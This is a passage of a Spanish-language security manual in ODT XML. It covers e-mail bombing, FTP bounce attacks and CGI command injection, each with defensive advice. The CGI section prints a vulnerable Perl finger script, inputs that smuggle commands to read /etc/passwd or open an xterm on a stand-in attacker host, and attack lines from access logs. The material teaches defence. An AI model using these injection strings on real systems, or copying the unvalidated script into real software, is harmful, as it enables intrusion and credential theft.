disco como resultado de postings múltiples y de entradas en el “syslog”.</text:p>
      <text:p text:style-name="Text_20_body">- ¿Cómo proceder?<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Detección</text:span><text:line-break/><text:line-break/>Si un sistema aparece repentinamente lento (el e-mail es lento o no parece ser enviado o recibido), la razón puede ser que su mailer está intentando procesar una excesiva cantidad de mensajes. Esto puede comprobarse a través del “log” de sistema.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Reacción</text:span><text:line-break/><text:line-break/>Es importante:<text:line-break/><text:line-break/>Identificar la fuente del e-mail bomb/spam y configurar el router para evitar el acceso de los paquetes entrantes de esa dirección. Puede colocar un “access list” en el port 25 (SMTP) del tipo “established” para esa dirección.<text:line-break/><text:line-break/>Observar los “headers” del e-mail para determinar su origen verdadero.<text:line-break/><text:line-break/>Ponerse en contacto con el sitio que se identificó en la revisión con el propósito de alertarlos de la actividad del spammer.<text:line-break/><text:line-break/>Asegurarse de tener la versión más actualizada del “daemon” de mail (por ejemplo sendmail) y aumentar el grado de “debug” o “log” que posea el proceso, para detectar o alertar estas actividades. Tener la precaución de vigilar el tamaño del archivo de log, que puede crecer considerablemente, si se está bajo un e-mail-bombing.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Prevención</text:span><text:line-break/><text:soft-page-break/><text:line-break/>Desafortunadamente, hasta el momento, no hay manera de prevenir el bombardeo de e-mail o spamming y es imposible predecir el origen del ataque siguiente. Es trivial obtener acceso a listas de interés o acceder a información que contenga grandes volúmenes de direcciones de e-mail, las que proporcionan al atacante direcciones de destino para el spam.<text:line-break/><text:line-break/>Pueden desarrollarse herramientas internas, que pueden ayudar a reconocer y a responder al e-mail bombing/spamming reduciendo, de esta manera, el impacto de tal actividad. Tales herramientas deben aumentar las capacidades de log y alertar de mensajes que vienen de un mismo lugar en un corto período de tiempo. Asimismo, deberían ser capaces de rechazar esos mensajes, o descartarlos.<text:line-break/><text:line-break/>Si un sitio utiliza un número pequeño de servidores de e-mail, podría configurarse un “firewall” para asegurarse de que las conexiones de “smtp” fuera de su firewall puedan hacerse solamente a sus “hubs” de mail y a ninguno de los otros equipos. Aunque esta operación no prevendrá un ataque, reduce al mínimo el número de las máquinas disponibles para un ataque basado en SMTP. De este modo, se puede controlar el tráfico entrante SMTP y filtrarlo de manera acorde.</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Problemas de seguridad en el FTP</text:span></text:p>
      <text:list xml:id="list1653667800" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P3">- El comando PORT </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">En los últimos años, se ha incrementado el debate en torno a los problemas relacionados con el comando PORT del protocolo del FTP. Estos problemas se basan el uso erróneo de dicho comando.<text:line-break/><text:line-break/>- El Protocolo FTP<text:line-break/><text:line-break/>Para entender estos ataques, es necesario tener una comprensión básica del protocolo FTP.<text:line-break/><text:line-break/>Un cliente abre una conexión al port de control de ftp (21) de un FTP SERVER. De este modo, para que el servidor sea capaz luego de enviar datos de nuevo a la máquina del cliente, una segunda conexión (de datos) debe abrirse entre el servidor y el cliente.<text:line-break/><text:line-break/>Para hacer esta segunda conexión, el cliente envía un comando PORT al servidor.<text:line-break/><text:line-break/>Este comando incluye parámetros que indican al servidor cuál IP ADDRESS conectar y qué port abrir en aquella dirección.<text:line-break/><text:line-break/>El servidor luego abre aquella conexión, siendo la fuente de la conexión el port 20 del servidor y el destino el port identificado en los parámetros del comando PORT.<text:line-break/><text:line-break/>El comando PORT se utiliza generalmente sólo en el " modo activo " del ftp (por default). No se suele utilizar en modo pasivo (PASV). Debe notarse que los servidores de ftp generalmente implementan ambos modos en ejecución, y el cliente especifica qué método utilizar.<text:line-break/><text:line-break/><text:soft-page-break/>- El ataque “Ftp bounce”<text:line-break/><text:line-break/>Conforme con el protocolo FTP, el comando PORT hace que la máquina que lo origina especifique una máquina de destino y un port arbitrarios para la conexión de datos. Sin embargo, esto también significa que un hacker puede abrir una conexión a un port del hacker eligiendo una máquina que puede no ser el cliente original.<text:line-break/><text:line-break/>Hacer esta conexión a una máquina arbitraria es hacer un ataque “ftp bounce”.<text:line-break/><text:line-break/>Con fines ilustrativos, se presentan seguidamente varios ejemplos de cómo los hackers pueden utilizar el “ftp bounce”.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">“Scanning” de ports</text:span><text:line-break/><text:line-break/>Un hacker que desea realizar una port scan contra un sitio puede hacerlo de un server FTP de un tercero , que actúa como un “puente” para el scan. El sitio de la víctima ve la exploración como procedente del server FTP más que de la fuente verdadera (el cliente FTP).<text:line-break/><text:line-break/>Bajo algunas circunstancias, esta técnica ofrece al hacker más ventajas que ocultar la fuente verdadera de la prueba. Cuando el sitio previsto de la víctima está en la misma subnet que el server FTP server, o cuando no filtra tráfico del server FTP , el hacker puede utilizar la máquina del servidor como la fuente del port scan más que la máquina del cliente, desviando de esta manera los controles de acceso que de otra manera se aplicarían.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">“Bypass” de dispositivos básicos de filtrado de paquetes</text:span><text:line-break/><text:line-break/>Un hacker puede realizar un “bypass” de un firewall en ciertas configuraciones de red.<text:line-break/><text:line-break/>Por ejemplo, supongamos que un sitio tiene su servidor de FTP anónimo detrás del firewall. Usando la técnica de port scan, un hacker determina que un web server interno en ese sitio está disponible en el acceso 8080, un port normalmente bloqueado por un firewall.<text:line-break/><text:line-break/>Conectándose al server FTP público del sitio, el hacker inicia otra conexión entre el server FTP y un port arbitrario, en una máquina no pública del sitio (por ejemplo el web server interno en el port 8080). Como resultado, el hacker establece una conexión a una máquina que sería protegida de otra manera por el firewall.<text:line-break/><text:line-break/>- Bypass de dispositivos de filtrado dinámicos<text:line-break/><text:line-break/>Otro problema se refiere a los sitios que tienen firewalls que utilizan filtros dinámicos para protegerse. Los sitios están abiertos al ataque porque el firewall confía en la información que recibe.<text:line-break/><text:line-break/><text:soft-page-break/>En este ejemplo, el sitio de la víctima contiene todos sus sistemas detrás de un firewall que utiliza los filtros dinámicos. Una persona en el sitio de la víctima hojea las páginas de la Web y baja un Java applet construido por el hacker. Sin el conocimiento de esa persona, el Java applet abre una conexión de salida de ftp a la máquina del hacker. El applet entonces publica un comando PORT de ftp, ordenando a la máquina del servidor abrir una conexión a, por ejemplo, el port telnet que de otra manera se encontraba protegido detrás del firewall.<text:line-break/><text:line-break/>Como el firewall de filtros dinámicos examina los paquetes de salida para determinar si alguna acción se requiere de su parte, observa el comando PORT y permite una conexión entrante del server web remoto al port del telnet en la máquina de la víctima. Esta conexión normalmente no es permitida por el firewall; fue permitida en este caso porque el comando PORT fue realizado por el cliente.<text:line-break/><text:line-break/>- Soluciones<text:line-break/><text:line-break/>Los ataques de los ejemplos demuestran el componente base de la vulnerabilidad: los contenidos del comando PORT del ftp no son tan dignos de confianza mientras están bajo control de un potencial atacante. El ejemplo del “ftp bounce” demuestra qué sucede cuando un servidor confía en la información. El ejemplo del filtro dinámico demuestra qué sucede cuando un firewall confía en la información.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Software del Ftp server</text:span><text:line-break/><text:line-break/>La mejor solución al problema del “ftp bounce” desde la perspectiva de la seguridad es asegurarse de que el software del server FTP no puede establecer conexiones a máquinas arbitrarias. Sin embargo, los sitios que confían en el comportamiento “RFC-compliant” pueden encontrar que el implementar esta solución afectará las aplicaciones que ellos utilizan.Por lo tanto, muchos vendedores ofrecen soluciones que permiten al sitio dar servicio de ftp adaptado a las necesidades del cliente . Las implementaciones del vendedor caen en tres grupos:<text:line-break/><text:line-break/>1) conformidad estricta con funciones del RFC: el comando PORT se puede utilizar para conectar directamente con una máquina de una tercera persona, y ésta es la única funcionalidad permitida. Algunos vendedores que eligen mantener conformidad estricta, han tratado este problema modificando el resto de los servicios de red para rechazar las conexiones que se originaban en el port de datos del ftp (port 20).<text:line-break/><text:line-break/>2) supresión estricta del comando PORT: el comando PORT puede ser utilizado para conectar con el cliente de origen, y ésta es la única funcionalidad permitida.<text:line-break/><text:line-break/>3) comportamiento variable del comando PORT: el comando PORT se puede utilizar en las dos formas descriptas, siendo una la forma por default. El cambiar entre ellas se logra generalmente con un parámetro en la línea de comando. Se debe tener cuidado de verificar cuál es el valor por default.<text:line-break/><text:line-break/><text:soft-page-break/>Asimismo, se debe tener conciencia sobre la categoría en que se halla el software del server. La recomendación es utilizar la opción 2, o la opción 3 con la supresión habilitada.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Configuración del Ftp server</text:span><text:line-break/><text:line-break/>Algunos de los ataques “ftp bounce” descriptos confían en unas o más máquinas del servidor (dependiendo del ataque) permitiendo el upload de archivos vía ftp(generalmente FTP anónimo ).<text:line-break/><text:line-break/>Su sitio debe ofrecer recursos anónimos de upload solo si es absolutamente necesario. Incluso luego, usted debe configurar cuidadosamente el área entrante.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Configuración de Red</text:span><text:line-break/><text:line-break/>Hay algunas cosas a tener presente al configurar las “fronteras” de la red, esto es, los routers con access-lists y los firewalls.<text:line-break/><text:line-break/>Los sitios deben asegurarse de que se diseñe cuidadosamente la topología de red de modo que los límites eficaces del tráfico existan entre los sistemas que ofrecen niveles distintos del servicio. Por ejemplo, un sitio tiene típicamente un servicio de FTP Anonymous, servicio del Web, y un hub entrante de correo electrónico. Una buena práctica de seguridad consiste en separar las máquinas que proporcionan estos servicios externos de las que realizan servicios internos. Es importante tener límites “fuertes” en la red, preferiblemente firewalls, entre estos dos conjuntos de máquinas.<text:line-break/><text:line-break/>Por ejemplo, los sitios que tienen un server FTP que permite el comando PORT para establecer conexiones a las máquinas de un tercero deben bloquear el tráfico entre el server FTP y las máquinas que ofrecen servicios que confían en el hostname o la dirección IP para la autenticación. Los ejemplos de tales servicios son rlogin, rsh y NFS. Mientras que un firewall o un filtering router debe prevenir siempre el acceso externo directo a tales servicios, debe también filtrar el tráfico de un server FTP interno que se comporte de esta manera. Esto advierte al server FTP que está siendo utilizado como una máquina de relay para atacar protocolos con mecanismos débiles de autenticación basados en el hostname o la dirección IP.<text:line-break/><text:line-break/>Los sitios que usan firewall de filtrado dinámico de paquetes dinámico necesitan tomar medidas adicionales para asegurarse de que los comandos PORT de terceros sean bloqueados por el firewall.<text:line-break/><text:line-break/>- Otros problemas del FTP<text:line-break/><text:line-break/>El FTP y los programas que lo implementan son reales problemas para los encargados de seguridad de los sistemas. Veamos una lista parcial de los mismos:<text:line-break/><text:line-break/>El protocolo, como hemos visto, usa dos conexiones TCP, complicando el trabajo de controlarlo a través de un firewall. En la mayoría de los casos un control de una conexión saliente requiere una <text:soft-page-break/>conexión entrante de datos.<text:line-break/><text:line-break/>El demonio ftpd corre inicialmente como root, ya que normalmente procesa un login a determinada cuenta, incluyendo el procesamiento de la password. Peor aún, no puede dejar su privilegio despues del login, el protocolo requiere conexión al port 20 el cual esté en el rango privilegiado.<text:line-break/><text:line-break/>Históricamente, han habido bugs en la implementación del demonio, lo cual ha producido grandes problemas de seguridad.<text:line-break/><text:line-break/>Por otra parte, el FTP anónimo se ha convertido en un standard de internet para distribuir software, documentos, etc. No hay duda que es un servicio útil, pero debe ser administrado con sumo cuidado.<text:line-break/><text:line-break/>La primera regla es que ningún archivo o directorio en el area de FTP anónimo debe ser poseida por el login ftp , ya que el FTP anónimo corre con esa identificación de usuario.<text:line-break/><text:line-break/>La siguiente regla es evitar colocar un archivo real /etc/passwd en el area de FTP anónimo. Hay que crear aquí un /etc/passwd “dummy”, con cuentas inexistentes y sin passwords reales encriptadas. En muchos casos se ha colocado aquí el /etc/passwd real, dando servido al hacker las passwords encriptadas para así hacer un ataque de diccionario.<text:line-break/><text:line-break/>Crear o no un directorio público de acceso read/write es tema de controversia. No hay duda que es útil hacerlo, pero se puede abusar fácil de ello. Uno puede encontrarse con su server convertido en repositorio de software pirata, por ejemplo. Este repositorio puede ser temporario o permanente, en el primer caso, hackers pueden usar su sitio como lugar de tránsito, consumiendo sus recursos.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Seguridad en WWW</text:span><text:line-break/><text:line-break/>En este apartado se verán las vulnerabilidades más comunes encontradas en los servidores de Web. Vía WWW, el demonio httpd se ha convertido rápidamente en una de las primeras "puntas de ataque" de los hackers. Es común ver reportes de los CERT que informan vulnerabilidades tales como el PHF (servicio de directorio “White pages”) en muchos servers, y las hay menos conocidas, como los scripts "query", y "prueba-cgi".<text:line-break/><text:line-break/>Existen dos caras de seguridad del webserver, una es proteger el sistema operativo en sí mismo de ser atacado vía WWW, la otra es proteger un Website en sí mismo de acceso no autorizado.<text:line-break/><text:line-break/>Atacar el sistema operativo vía WWW implica generalmente “trampear” un cgi script o lograr que el webserver haga algo que no fue pensado que haga, como por ejemplo dar al hacker acceso al shell del host, que ese hacker ejecute comandos arbitrarios en él , o le provea información útil para lograr esos objetivos.<text:line-break/><text:line-break/>Es obvio que los datos provistos a cualquier cgi script vía un form deben ser probados para su validez <text:soft-page-break/>por una razón u otra, y una de esas razones indudablemente es la seguridad.<text:line-break/><text:line-break/>Dependiendo de lo que el script vaya a hacer, la entrada aparentemente inocua de información puede tener graves consecuencias.<text:line-break/><text:line-break/>Por ejemplo, consideremos el siguiente script en perl en el cual se realiza un finger al usuario que se indicó en el campo de entrada del form y vuelvan los resultados al web browser ( Script encontrado frecuentemente en websites ):<text:line-break/><text:line-break/>#!/usr/local/bin/perl<text:line-break/><text:line-break/>$|=1;<text:line-break/><text:line-break/>require 'cgi-lib.pl';<text:line-break/><text:line-break/>&amp;ReadParse;<text:line-break/><text:line-break/>print &amp;PrintHeader;<text:line-break/><text:line-break/>open(IN, "/usr/bin/finger $in{'user_id'} |");<text:line-break/><text:line-break/>@stuff=;<text:line-break/><text:line-break/>foreach(@stuff) { print; }<text:line-break/><text:line-break/>exit;<text:line-break/><text:line-break/>e ingresamos como usuario lo siguiente:<text:line-break/><text:line-break/>kaiser;/bin/cat / etc/passwd<text:line-break/><text:line-break/>Si no se posee soporte de shadow passwords, se está en graves problemas. Lo precedente constituye un ejemplo muy básico de la forma que un " password grab” podría tomar. El tema es que el string podría contener cualquier comando arbitrario, como por ejemplo:<text:line-break/><text:line-break/>kaiser;/usr/openwin/xterm - display hackerz.R.US.com<text:line-break/><text:line-break/>Esto abriría un xterm en su consola, y además su shell tendría los mismos permisos que el demonio del httpd.<text:line-break/><text:line-break/>Por supuesto, el ejemplo antedicho no controló si la entrada en el form era un usuario o una bomba atómica, y dondequiera que uno vaya va a encontrar que en la documentación o en los ejemplos de <text:soft-page-break/>manejo de input cgi se explica siempre que hay que realizar un “escape” de cualquier meta-character de relevancia al shell con backslashes. Sin embargo, la situación fue calamitosa debido a que muchos ejemplos omitieron un pequeño carácter especial, a saber el newline (0x0A).<text:line-break/><text:line-break/>Las versiones viejas del httpd del NCSA y Apache (1,0,3) tenían una rutina de C, escape_shell_cmd() en su distribución que tenía este defecto.<text:line-break/><text:line-break/>Por lo tanto, cualquier persona que hacía uso de la función usando el módulo util.c compiló esa vulnerabilidad en sus cgi scripts. Una manera de explotar este bug es con el string:<text:line-break/><text:line-break/>http://somewhere.com/cgibin/<text:line-break/><text:line-break/>somescript?fakedata%0A/bin/cat%20/etc/passwd<text:line-break/><text:line-break/>o por ejemplo utilizando como string:<text:line-break/><text:line-break/>fakedata%0a/usr/openwin/xterm%20-display%20hackerz.R.US.com<text:line-break/><text:line-break/>Si se descubre en el log de acceso cosas como:<text:line-break/><text:line-break/>nserv.tsa.de - - [13/Dec/1996:00:03:13 -0500] \<text:line-break/><text:line-break/>"GET /cgi-bin/phf?Qname=asd%0acat%20/etc/passwd HTTP/1.0" 200 1467<text:line-break/><text:line-break/>www3-leav.army.mil - - [28/Dec/1996:10:04:59 -0500] \<text:line-break/><text:line-break/>"GET /cgi-bin/phf/?Qalias=x%ff/bin/cat%20/etc/passwd" 200 -<text:line-break/><text:line-break/>ld49-037.compuserve.com - - [12/Jan/1997:06:54:22 -0500] \<text:line-break/><text:line-break/>"GET /cgi-bin/phf?Qalias=x%0a/usr/bin/id HTTP/1.0" 200 -<text:line-break/><text:line-break/>significa que hackers han intentado ya esto en su sistem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56:43.911308031</meta:creation-date>
    <dc:date>2023-10-28T10:57:22.222517009</dc:date>
    <meta:editing-duration>PT38S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="21" meta:paragraph-count="15" meta:word-count="7567" meta:character-count="47523" meta:non-whitespace-character-count="39709"/>
    <meta:generator>LibreOffice/6.4.7.2$Linux_X86_64 LibreOffice_project/40$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>